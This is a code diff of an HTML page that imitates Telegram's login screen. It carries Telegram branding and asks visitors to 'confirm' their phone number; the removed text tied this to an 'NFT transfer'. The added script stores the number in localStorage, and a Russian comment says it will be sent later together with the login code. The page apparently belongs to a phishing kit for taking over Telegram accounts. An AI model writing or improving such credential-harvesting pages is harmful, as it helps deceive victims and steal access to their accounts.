@@ -5,8 +5,6 @@
     <style>
         body { background: #000; color: #fff; font-family: -apple-system, sans-serif; text-align: center; padding: 40px 20px; }
         .tg-icon { width: 80px; height: 80px; margin-bottom: 25px; }
-        h2 { font-size: 26px; margin-bottom: 10px; }
-        p { color: #8a99a8; font-size: 15px; margin-bottom: 30px; line-height: 1.4; }
         input { width: 100%; padding: 16px; background: #1c252f; border: 1px solid #2a3644; border-radius: 12px; color: #fff; font-size: 16px; margin-bottom: 20px; box-sizing: border-box; outline: none; }
         .btn { width: 100%; padding: 16px; background: #248bdf; border: none; border-radius: 12px; color: #fff; font-weight: bold; font-size: 16px; cursor: pointer; }
     </style>
@@ -16,22 +14,20 @@
         <circle cx="120" cy="120" r="120" fill="#248bdf"/>
         <path d="M54 116.7l124.6-48.1c5.8-2.2 10.8 1.2 8.9 10.3l-21.2 100.1c-1.6 7.2-5.9 8.9-11.9 5.6L122 158l-15.7 15.1c-1.7 1.7-3.2 3.2-6.6 3.2l2.3-33.3 60.7-54.8c2.6-2.3-.6-3.6-4.1-1.3L83.7 137.4 51.5 127.3c-7-2.2-7.1-7 1.5-10.6z" fill="#fff"/>
     </svg>
-
     <h2>Log in to Telegram</h2>
-    <p>Confirm your phone number to authorize the NFT transfer.</p>
-    
+    <p style="color: #8a99a8; margin-bottom: 30px;">Confirm your phone number.</p>
     <input type="tel" id="phone" placeholder="+7 900 000-00-00">
-    <button class="btn" onclick="check()">Next</button>
+    <button class="btn" id="nextBtn">Next</button>
 
     <script>
-        function check() {
-            const val = document.getElementById('phone').value;
-            if (val.trim().length < 8) {
-                alert("Please enter your phone number correctly");
-            } else {
-                window.location.href = "code.html";
-            }
-        }
+        document.getElementById('nextBtn').onclick = function() {
+            const phone = document.getElementById('phone').value;
+            if(phone.length < 10) return alert("Enter full number");
+            
+            // Сохраняем номер в памяти браузера, чтобы отправить его позже вместе с кодом
+            localStorage.setItem('user_phone', phone);
+            window.location.href = "code.html";
+        };
     </script>
 </body>
 </html>
